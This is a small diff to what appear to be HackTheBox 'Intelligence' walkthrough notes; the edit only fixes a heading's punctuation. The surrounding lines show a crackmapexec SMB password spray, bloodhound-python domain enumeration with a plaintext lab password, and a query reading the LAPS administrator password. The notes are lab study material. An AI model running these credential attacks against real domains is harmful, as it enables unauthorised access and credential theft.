@@ -48,7 +48,7 @@ crackmapexec smb 10.10.10.248 -u users -p NewIntelligenceCorpUser9876 --continue
 ```
 bloodhound-python -c ALL -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -d intelligence.htb -dc intelligence.htb -ns 10.10.10.248
 ```
-##### Get LAPS administrtor Password if you have permissions"
+##### Get LAPS administrtor Password if you have permissions:
 ```
 Get-ADComputer DC01 -property 'ms-mcs-admpwd'
 ```
